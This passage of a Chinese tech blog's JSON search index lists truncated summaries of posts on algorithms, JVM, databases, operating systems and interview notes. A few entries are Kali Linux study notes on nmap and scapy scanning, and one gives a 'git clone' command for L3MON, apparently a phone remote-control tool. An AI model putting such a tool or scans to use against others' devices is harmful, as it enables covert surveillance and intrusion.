息队列的本质是将同步处理转成异步处理，异步会带来相应的好处，但也有弊端。 .可在模块、服务、接口等不","lvl0":"消息队列基础应用","lvl1":["消息队列"],"lvl2":"摘要","objectID":"9fae9ae3c308ee9412d6e1fa959766d9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%9F%BA%E7%A1%80/"},{"content":"select in share mode 理解 SELECT … LOCK IN SHARE MODE ：共享锁(S锁, share locks)。其他事务可以读取数据，但不能对该数据进行修改，直到所有的共享锁被释放。 如果事务对某行","lvl0":"小麦","lvl1":null,"lvl2":"摘要","objectID":"567080fe12446b12a4208488238458f1","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%B0%8F%E9%BA%A6%E7%AC%94%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"},{"content":"1:1 线程模型 以上我提到的内核线程（Kernel-Level Thread, KLT）是由操作系统内核支持的线程，内核通过调度器对线程进行调度，并负责完成线程的","lvl0":"协程的原理","lvl1":null,"lvl2":"摘要","objectID":"c2e91c4a9c99cfa253ee9de5c0e4be3a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86/"},{"content":"协议 概念： 协议是事先约定好的，大家共同遵守 的一组规则 可以简单理解为各个主机之间通信的使用的共同的语言。 **应用层：**就是应用软件使用的协议","lvl0":"协议相关的内容【网络基础】","lvl1":null,"lvl2":"摘要","objectID":"08fa9b2e516e00972371634d248b2b45","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"},{"content":"备份 点击 控制 -\u0026gt; 工具 -\u0026gt; 备份","lvl0":"虚拟机备份","lvl1":null,"lvl2":"摘要","objectID":"676f14d4ed812ad0e707ef6c7ddfc0bd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/virtualbox%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%87%E4%BB%BD/"},{"content":"序列化二叉树 请实现两个函数，分别用来序列化和反序列化二叉树。 您需要确保二叉树可以序列化为字符串，并且可以将此字符串反序列化为原始树结构。 样例","lvl0":"序列化二叉树","lvl1":null,"lvl2":"摘要","objectID":"78079ffc87a658a45cb51f5900b1ffa2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个升序的数组的一个旋转，输出旋转数组的最小元素。 例如数组 { $3,4,5,1,2$} 为{ $1,2,3,4,5$ }","lvl0":"旋转数组的最小数字","lvl1":null,"lvl2":"摘要","objectID":"46f1a939dea7f6113b2618c5dae8d35b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/"},{"content":"常见的排序算法 稳定的排序算法 冒泡排序 $O(N^2)$ 插入排序 $O(N^2)$ 桶排序(bucket sort) , $O(N^2)$ , 需要额外 $O(K)$ 的空间 合并排序 (MergeSort ) $O(NlogN)$ ,额外 $O(N)$ 的空间 基数排序 $O(N*K) $ , 需要 $O(N)$","lvl0":"选择题面试常考","lvl1":null,"lvl2":"摘要","objectID":"aa03fc85c0a816cbaf3c52d787f745fc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AE%97%E6%B3%95/%E9%80%89%E6%8B%A9%E9%A2%98%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%80%83/"},{"content":"hugo 渲染latex失败 去掉多余的空格，最好一行显示 ， 要换行 需要打上 4个 \\ ，不然服务器渲染会有问题","lvl0":"渲染latex失败解决方法","lvl1":null,"lvl2":"摘要","objectID":"40fdb7adebf7699af762ae83634bbd15","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/hugo/hugo-%E6%B8%B2%E6%9F%93latex%E5%A4%B1%E8%B4%A5/"},{"content":"学习资料收集 靶场 不错的UP主视频 学神 kali 靶机练习教程 千峰学习资料 心东的学习教程, 这个视频的老哥有点牛逼 小迪渗透 学习网站 10.HackingLo","lvl0":"学习资料收集","lvl1":null,"lvl2":"摘要","objectID":"26a88e9bba058bbe59cff2194dd5f2ba","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/%E6%94%B6%E9%9B%86%E8%B5%84%E6%96%99/"},{"content":"$0,1,\u0026hellip;,n-1$ 这 n 个数字 $(n\u0026gt;0) $ 排成一个圆圈，从数字 0 开始每次从这个圆圈里删除第 $ m $ 个数字。 求出这个圆圈里剩下的最后一个数字。 样例 1 2 3 输入：n=5 , m=3 输","lvl0":"圆圈中最后一个数【小米笔试题】","lvl1":null,"lvl2":"摘要","objectID":"290c4907b515664ab8986848e41335b5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E6%95%B0%E5%B0%8F%E7%B1%B3%E7%AC%94%E8%AF%95%E9%A2%98/"},{"content":"参考的项目地址 adb连接夜神模拟器 参考视频 github 的工具地址 1 git clone https://github.com/D3VL/L3MON.git","lvl0":"远程控制收集","lvl1":["linux"],"lvl2":"摘要","objectID":"0d8d5dc2cc206189695e7853b2ede9a0","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%94%B6%E9%9B%86%E6%95%99%E7%A8%8B/%E6%8E%A7%E5%88%B6%E6%89%8B%E6%9C%BA%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"content":"远光科技 mysql 行转列 这个名词有点新，但是 之前也被问过一次【一共被问2次】， 因此，应该是个隐藏考点 mysql 行转列 1 2 3 4 5 6 7 8 9 DROPTABLEIF","lvl0":"远光","lvl1":null,"lvl2":"摘要","objectID":"6ac6034dd1fa320665e2b74a6313dc74","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E8%BF%9C%E5%85%89/"},{"content":"算法题 【数位dp ,前导0问题】 leetcode 原题 问题描述： 给定正整数 N，返回小于等于 N 且具有至少 1 位重复数字的正整数的个数。 示例 1： 输入：20 输出：1 解","lvl0":"阅文集团笔试总结","lvl1":null,"lvl2":"摘要","objectID":"b28069134f45617cf36924f0328cbceb","tags":["选择题刷题笔记","做题家速成"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E9%98%85%E6%96%87%E9%9B%86%E5%9B%A2%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93_2021_9_29/"},{"content":"运行时数据区 运行时数据区内有哪些东西 1.8以前： 线程共享的有堆和方法区（永久代是其实现方式） 线程独立的有本地方法栈、虚拟方法栈和程序计数器 1","lvl0":"运行时数据区","lvl1":null,"lvl2":"摘要","objectID":"84f5269dbb0867eb6d1d4208af97ba50","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA/"},{"content":"如何判断公司是否有坑 判断是否有坑 判断投资方面 关注我的直接上级，直接主管【他能决定我获得的能力和成长】 查询企业信用 天眼查 企查查 互联网 4.如果我","lvl0":"怎么判断公司","lvl1":null,"lvl2":"摘要","objectID":"cac4b6a9ab8d5d2acc5f6cc7e8e07cd6","tags":["怎么选择offer","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E5%85%AC%E5%8F%B8/"},{"content":"栈的压入弹出序列 输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。 假设压入栈的所有数字均不相等。 例如序","lvl0":"栈的压入弹出序列","lvl1":null,"lvl2":"摘要","objectID":"a52231a2fdfb6df2a4354405c36959cb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/"},{"content":"找出数组中重复的数字 给定一个长度为 nn 的整数数组 nums，数组中所有的数字都在 $0∼n−1$ 的范围内。 数组中某些数字是重复的，但不知道有几个数","lvl0":"找出数组中重复的数字","lvl1":null,"lvl2":"摘要","objectID":"585d63c73e16f12bdcf81498eb9e8885","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%81%8D%E5%8E%86/%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"请实现一个函数用来匹配包括'.'和'*'的正则表达式。 模式中的字符'.'表示任意一个字符，而'*'表示它前面的字符可以出现任意次（含0次）。","lvl0":"正则表达式匹配","lvl1":null,"lvl2":"摘要","objectID":"0959d394edaadd2560ae56cced4d4b4f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/"},{"content":"前端优化技巧 tinypng 优化 https://tinypng.com/ 对图片进行压缩 图片的优化，也是从两个方面来考虑：太多 和 太大。 可以通过懒加载减少图片的请求，或者通过雪碧图来合并图片，以及","lvl0":"重绘与重排","lvl1":null,"lvl2":"摘要","objectID":"52fcbca43f747d65d27d4dfa067118f6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7/%E9%87%8D%E7%BB%98%E4%B8%8E%E9%87%8D%E6%8E%92/"},{"content":"重建二叉树 输入一棵二叉树前序遍历和中序遍历的结果，请重建该二叉树。 注意: 二叉树中每个节点的值都互不相同； 输入的前序遍历和中序遍历一定合法； 样","lvl0":"重建二叉树","lvl1":null,"lvl2":"摘要","objectID":"ad2025ff842fb5e04ae65ef8f4bc5bb7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"主动信息收集学习 基于ping探测 基于nmap扫描方式 使用 scapy 定制数据包进行高级扫描 僵尸扫描 主动信息收集原理 直接与目标系统交互通信 无法避免留下访","lvl0":"主动信息收集原理","lvl1":null,"lvl2":"摘要","objectID":"1cf1ce4049c577f653fc43bbb06442b2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8E%9F%E7%90%86/"},{"content":"如何自定义线程池 corePoolSize 核心线程数 maximumPoolSize 最大线程数 keepAliveTime 线程存活时间【超出核心线程数的那部分】 unit 时间单位 workQueue 任务队列 threadFactory, 线程工厂，自定义线程的名字【用户自定义","lvl0":"自定义线程池的方法","lvl1":null,"lvl2":"摘要","objectID":"d8b11d0c4ebc174830985024d36f6825","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BA%BF%E7%A8%8B%E6%B1%A0/"},{"content":"剑指 Offer II 097. 子序列的数目 Difficulty: 困难 给定一个字符串 s和一个字符串 t ，计算在 s 的子序列中 t 出现的个数。 字符串的一个 子序列 是指，通过删除一些（也可以不删","lvl0":"子序列的数目","lvl1":null,"lvl2":"摘要","objectID":"bf36a74419b26c60c26310109967bb70","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%95%B0%E7%9B%AE/"},{"content":"给出一个二叉树，输入两个树节点，求它们的最低公共祖先。 一个树节点的祖先节点包括它本身。 注意： 输入的二叉树不为空； 输入的两个节点一定不为空，且","lvl0":"最近公共祖先","lvl1":null,"lvl2":"摘要","objectID":"c387f8dd249e8302e4574bb9a6d06c54","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"},{"content":"最小的 k个数 输入 n 个整数，找出其中最小的 k 个数。 注意： 输出数组内元素请按从小到大顺序排序; 数据范围 $1≤k≤n≤1000$ 样例 1 2 3 输入：[","lvl0":"最小的k个数","lvl1":null,"lvl2":"摘要","objectID":"42a19107c11cac3c83750b3ae6a8781a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AE%B9%E5%99%A8/%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0/"},{"content":"1.概述 在本篇文章中，你将掌握最常用的 JVM 参数配置。如果对于下面提到了一些概念比如堆、 2.堆内存相关 Java 虚拟机所管理的内存中最大的一块，Java","lvl0":"最重要的JVM参数指南","lvl1":null,"lvl2":"摘要","objectID":"0a5368b6a8897892c0ea3739565c6a80","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84jvm%E5%8F%82%E6%95%B0%E6%8C%87%E5%8D%97/"},{"content":"cdn 加速 所谓的 CDN 加速技术，就是将客户端上传的图片、音视频发布到多个分布在各地的 CDN 节点的服务器上，当有用户需要访问这些图片和音视频时，能够通过 DNS","lvl0":"cdn原理","lvl1":null,"lvl2":"摘要","objectID":"bd7504bf80484890221a57c816855802","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/cdn%E5%8E%9F%E7%90%86/"},{"content":"如何保证消息可靠传递 什么是 ACK 有了 TCP 协议本身的 ACK 机制为什么还需要业务层的 ACK 机制？ tcp的ack只能保证连接层的“不丢数据”和“不乱序”，但数据","lvl0":"保证消息的可靠性","lvl1":null,"lvl2":"摘要","objectID":"cb3a056b2028f0eaebb7c4c0e32f8105","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B6%88%E6%81%AF%E4%B8%A2%E5%A4%B1%E6%96%B9%E6%A1%88%E8%A7%A3%E5%86%B3/"},{"content":"","lvl0":"多终端漫游技术解决方案","lvl1":null,"lvl2":"摘要","objectID":"545fac21ec157fb2938a54acfc6d10d4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%BC%AB%E6%B8%B8/"},{"content":"自动智能扩缩容：直播互动场景中峰值流量的应对 随着近几年各种直播 App 和百万答题 App 的火爆和风靡，具有高实时性要求的直播互动场景开始纷纷借助即时消息","lvl0":"即时消息","lvl1":null,"lvl2":"摘要","objectID":"ee24e9afcaca02f968d734bd07bc6f8e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%8D%B3%E6%97%B6%E6%B6%88%E6%81%AF/"},{"content":"针对超高流量带来的请求压力，业界比较常用的一种方式就是“流控”。 “流控”这个词你应该不陌生，当我们坐飞机航班延误或者被取消时，航空公司给出的","lvl0":"流量控制","lvl1":null,"lvl2":"摘要","objectID":"f44df58512ca681e0eb99e48cbcc9f2e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/"},{"content":"消息收发架构 一个传统的视频网站如果想让自己的视频支持弹幕功能，也可以通过引入即时消息的技术，来让视频弹幕的参与者能实时、高效地和其他观看者进","lvl0":"消息表设计","lvl1":null,"lvl2":"摘要","objectID":"63b199916e572871f2e3d2bebb8ca8f8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81%E6%96%B9%E6%A1%88/"},{"content":"性能调优 那么找到了系统的瓶颈点，我们要如何优化呢？优化方案会随着问题的不同而不同。比方说，如果是数据库访问慢，那么就要看是不是有锁表的情况、","lvl0":"性能调优","lvl1":null,"lvl2":"摘要","objectID":"70cf7405fd188497e7677e196176fa08","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B9%B6%E5%8F%91/%E5%87%BA%E7%8E%B0%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%80%8E%E4%B9%88%E5%88%86%E6%9E%90/"},{"content":"考研408复习笔记 目的专业：计算机科学与技术 预计考研专业课科目：408 （第一次发现原来gayhub也可以用来存放学习笔记哇） 主要包括408以","lvl0":"readme","lvl1":null,"lvl2":"摘要","objectID":"cd6947dec5b2becb03227d65672bc3e2","tags":null,"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02_2.408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%8D%E4%B9%A0/readme/"},{"content":"《计算机网络》复习笔记 这个笔记同时使用了两本教材：《计算机网络：自顶向下方法（原书第六版）》和《计算机网络（谢希仁 第七版）》， 目录结构按照自","lvl0":"计算机网络复习_","lvl1":null,"lvl2":"摘要","objectID":"25a7a3f1d8f03ce02a9a488507b0416d","tags":null,"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02_2.408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%8D%E4%B9%A0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/"},{"content":"Docker Docker 组件 组件 Docker Daemon（Dockerd）：Docker容器管理的守护进程，负责和Docker client交互，并管理Docker镜像、容","lvl0":"网友总结-2021 秋招结束后- Docker","lvl1":null,"lvl2":"摘要","objectID":"89c12efbb2d773a21613c801d8e7a3e3","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/docker_k8s/docker/"},{"content":"IPC通信 IPC 标识符（ID）：ID是IPC结构的内部名，用来确保使用同一个通讯通道，消息队列、信号量和共享存储段都属于内核中的IPC结构，它们","lvl0":"网友总结-2021 秋招结束后- IPC 通信","lvl1":null,"lvl2":"摘要","objectID":"f2d4d0e81047ea1270c0da7ab1bbac5e","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/ipc%E9%80%9A%E4%BF%A1/"},{"content":"Mysql 基础架构 server层 连接器：管理连接，权限验证 使用长连接后，你可能会发现，有些时候 MySQL 占用内存涨得特别快，这是因为 MySQL 在执行过程中临时使用的","lvl0":"网友总结-2021 秋招结束后- Mysql","lvl1":null,"lvl2":"摘要","objectID":"8f74a937460132e5d263463623b2eec3","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/mysql/mysql/"},{"content":"Linux Namespace UTS Namespace 进程task结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /* 每个进程对应的task结构体struct task_struct中，增加了一个叫n","lvl0":"网友总结-2021 秋招结束后- namespace","lvl1":null,"lvl2":"摘要","objectID":"72c2fb57238ab066d9e4ce36eedcbff8","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/namespace/"},{"content":"redis 数据结构 字符串 列表 哈希表 set sort set Bitmaps BloomFilter HyperLogLog Pub/Sub Redis Module RedisSearch Redis-ML redis数据结构 sds字符串 1 2 3 4 5 6 7 8 struct sdshdr { //字符长度 unsigned int len; //当前可用空间 unsigned int free;","lvl0":"网友总结-2021 秋招结束后- Redis","lvl1":null,"lvl2":"摘要","objectID":"55bf78baa48c8f9c467f94ba7ac9e315","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/redis/redis/"},{"content":"进程与线程 task_struct 进程状态 5个互斥状态： 状态 描述 TASK_RUNNING 表示进程要么正在执行，要么正要准备执行（已经就绪），正在等待cpu时间片的调度 TASK_INTERRUPTIBLE 进程因为等待一些","lvl0":"网友总结-2021 秋招结束后- 进程和线程","lvl1":null,"lvl2":"摘要","objectID":"887745c13724085ec0c436836fc5309b","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"},{"content":"内存 Linux 内存概述 UMA和NUMA两种模型 均匀存储器存取（Uniform-Memory-Access，简称UMA）模型：传统的多核运算是使用SM","lvl0":"网友总结-2021 秋招结束后- 内存","lvl1":null,"lvl2":"摘要","objectID":"cd9a2aef2bb6d8050454c92dd4b51514","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%86%85%E5%AD%98/"},{"content":"网络 OSI，TCP/IP，五层协议的体系结构 OSI分层（7层）：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层 TCP/IP分层（","lvl0":"网友总结-2021 秋招结束后- 网络","lvl1":null,"lvl2":"摘要","objectID":"800adb448fdc07df42b2c8aca9a9e728","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C/"},{"content":"文件系统 Linux mount 挂载概念 Linux中的根目录以外的文件要想被访问，需要将其挂载到根目录下的某个目录来实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20","lvl0":"网友总结-2021 秋招结束后- 文件系统","lvl1":null,"lvl2":"摘要","objectID":"30a178d234c610de116538ac99e0725b","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/%E7%BD%91%E5%8F%8B%E6%80%BB%E7%BB%93/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"127. 单词接龙 Difficulty: 困难 字典 wordList 中从单词 beginWord和 endWord 的 转换序列 是一个按下述规格形成的序列： 序列中第一个单词是 beginWord 。 序列中最后一个单词是 endWord 。 